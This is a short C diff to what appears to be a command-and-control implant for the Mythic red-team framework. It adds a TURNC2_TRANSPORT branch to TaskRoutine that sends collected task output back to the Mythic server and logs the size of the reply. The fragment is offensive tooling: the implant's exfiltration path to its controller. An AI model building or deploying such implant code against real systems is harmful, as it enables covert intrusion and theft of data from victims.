@@ -364,6 +364,18 @@ VOID TaskRoutine()
 
 #endif
 
+#ifdef TURNC2_TRANSPORT
+
+    if ( PackageSendAll(&Output) )
+    {
+        if ( Output.Buffer != NULL )
+        {
+            _dbg("Response from Mythic: %d bytes", Output.Length);
+        }
+    }
+
+#endif
+
 #ifdef SMB_TRANSPORT
 
     PBYTE  pOutData = NULL;
